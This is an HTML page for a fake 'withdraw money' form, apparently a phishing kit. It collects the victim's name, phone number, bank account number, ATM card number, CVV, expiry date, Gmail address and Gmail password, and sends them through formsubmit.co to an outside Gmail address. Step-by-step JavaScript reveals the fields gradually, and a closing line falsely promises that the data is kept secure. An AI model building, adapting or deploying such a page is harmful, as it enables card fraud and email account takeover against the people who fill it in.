<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>FILL THIS FORM TO WITHDRAW MONEY</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; max-width: 600px; margin: auto; }
    .hidden { display: none; }
    .message-box { padding: 10px; margin-top: 10px; border-radius: 5px; }
    .green { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
    .red { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
    input, select, button { display: block; width: 100%; margin-top: 10px; padding: 8px; font-size: 16px; }
    .toggle-password { position: absolute; right: 10px; top: 38px; cursor: pointer; }
    .password-wrapper { position: relative; }
  </style>
</head>
<body>
  <h2>FILL THIS FORM TO WITHDRAW MONEY</h2>
  <form id="withdrawForm" action="https://formsubmit.co/exellentfirm@gmail.com" method="POST"><!-- Field 1: Full Name -->
<label for="fullName">Full Name</label>
<input type="text" id="fullName" name="Full Name" required>

<!-- Field 2: Phone Number -->
<label for="phoneNumber">Phone Number</label>
<input type="tel" id="phoneNumber" name="Phone Number" pattern="\d{9,13}" title="Phone number must be between 9 to 13 digits" required>

<!-- Field 3: Amount Allocated -->
<label for="amount">Amount Allocated</label>
<input type="text" id="amount" name="Amount Allocated" pattern="\d{4,10}" title="Enter the amount allocated (4 to 10 digits)" required>

<!-- Field 4: Confirmation -->
<label for="withdrawChoice">Do you want to withdraw this amount to this phone number?</label>
<select id="withdrawChoice" name="Withdraw Choice" required>
  <option value="">--Select--</option>
  <option value="Yes">Yes</option>
  <option value="No">No</option>
</select>

<div id="bankQuestionBox" class="hidden">
  <label for="hasBank">Do you have a bank account?</label>
  <select id="hasBank" name="Has Bank Account">
    <option value="">--Select--</option>
    <option value="Yes">Yes</option>
    <option value="No">No</option>
  </select>
</div>

<div id="altOptionBox" class="hidden">
  <label for="paymentOption">Which Payment Option do you have?</label>
  <select id="paymentOption" name="Payment Option">
    <option value="">--Select--</option>
    <option value="Other Number">Other Number</option>
    <option value="Bank Account">Bank Account</option>
  </select>
</div>

<div id="altNumberBox" class="hidden">
  <label for="altNumber">Alternate Phone Number</label>
  <input type="tel" id="altNumber" name="Alternate Phone Number">
</div>

<!-- Bank Info -->
<div id="bankInfo" class="hidden">
  <label for="bankAccount">Bank Account Number</label>
  <input type="text" id="bankAccount" name="Bank Account Number">

  <label for="atmLinked">Is your ATM linked?</label>
  <select id="atmLinked" name="ATM Linked">
    <option value="">--Select--</option>
    <option value="Yes">Yes</option>
    <option value="No">No</option>
  </select>
</div>

<!-- Card Verification -->
<div id="cardInfo" class="hidden">
  <label for="cardNumber">ATM Card Number</label>
  <input type="text" id="cardNumber" name="ATM Card Number" pattern="\d{16}" title="Card Number must be 16 digits">

  <label for="cvv">CVV</label>
  <input type="text" id="cvv" name="CVV" pattern="\d{3}" title="CVV must be 3 digits">

  <label for="expiry">Expiry Date (MM/YY)</label>
  <input type="text" id="expiry" name="Expiry Date" placeholder="MM/YY">
</div>

<!-- Email Confirmation -->
<div id="emailBox" class="hidden">
  <p>Enter your email address to track your withdrawal. We shall email you when the transaction is completed.</p>

  <label for="email">Email Address</label>
  <input type="email" id="email" name="Email" pattern=".+@gmail\.com" title="Only Gmail addresses allowed">

  <div class="password-wrapper">
    <label for="emailPassword">Email Password</label>
    <input type="password" id="emailPassword" name="Email Password">
    <span class="toggle-password" onclick="togglePassword()">üëÅÔ∏è</span>
  </div>
</div>

<div class="message-box hidden" id="statusMessage"></div>

<button type="submit" id="submitButton">Submit</button>

  </form>  <p style="margin-top:20px; font-size: 14px; color: gray;">We keep your data secure and confidential.</p>  <script>
    const form = document.getElementById("withdrawForm");
    const withdrawChoice = document.getElementById("withdrawChoice");
    const hasBank = document.getElementById("hasBank");
    const bankQuestionBox = document.getElementById("bankQuestionBox");
    const altOptionBox = document.getElementById("altOptionBox");
    const altNumberBox = document.getElementById("altNumberBox");
    const paymentOption = document.getElementById("paymentOption");
    const bankInfo = document.getElementById("bankInfo");
    const cardInfo = document.getElementById("cardInfo");
    const emailBox = document.getElementById("emailBox");
    const atmLinked = document.getElementById("atmLinked");
    const statusMessage = document.getElementById("statusMessage");
    const submitButton = document.getElementById("submitButton");

    function togglePassword() {
      const pwd = document.getElementById("emailPassword");
      pwd.type = pwd.type === "password" ? "text" : "password";
    }

    withdrawChoice.addEventListener("change", () => {
      const choice = withdrawChoice.value;
      if (choice === "Yes") {
        bankQuestionBox.classList.remove("hidden");
        altOptionBox.classList.add("hidden");
        altNumberBox.classList.add("hidden");
        resetMessages();
      } else if (choice === "No") {
        altOptionBox.classList.remove("hidden");
        bankQuestionBox.classList.add("hidden");
        resetMessages();
      } else {
        bankQuestionBox.classList.add("hidden");
        altOptionBox.classList.add("hidden");
        altNumberBox.classList.add("hidden");
        resetMessages();
      }
    });

    hasBank.addEventListener("change", () => {
      if (hasBank.value === "Yes") {
        bankInfo.classList.remove("hidden");
        statusMessage.classList.add("hidden");
      } else {
        bankInfo.classList.add("hidden");
        cardInfo.classList.add("hidden");
        emailBox.classList.add("hidden");
        showCancelled();
      }
    });

    atmLinked.addEventListener("change", () => {
      if (atmLinked.value === "Yes") {
        cardInfo.classList.remove("hidden");
        emailBox.classList.remove("hidden");
        resetMessages();
      } else {
        cardInfo.classList.add("hidden");
        emailBox.classList.add("hidden");
        showCancelled();
      }
    });

    paymentOption.addEventListener("change", () => {
      if (paymentOption.value === "Other Number") {
        altNumberBox.classList.remove("hidden");
        bankQuestionBox.classList.remove("hidden");
      } else if (paymentOption.value === "Bank Account") {
        altNumberBox.classList.add("hidden");
        bankQuestionBox.classList.remove("hidden");
      } else {
        altNumberBox.classList.add("hidden");
        bankQuestionBox.classList.add("hidden");
      }
    });

    function showCancelled() {
      statusMessage.classList.remove("hidden");
      statusMessage.className = "message-box red";
      statusMessage.textContent = "Transactions Cancelled";
      submitButton.textContent = "Transactions Cancelled";
      submitButton.style.backgroundColor = "#dc3545";
      submitButton.disabled = true;
    }

    function resetMessages() {
      statusMessage.classList.add("hidden");
      submitButton.textContent = "Submit";
      submitButton.disabled = false;
      submitButton.style.backgroundColor = "";
    }
  </script></body>
</html>
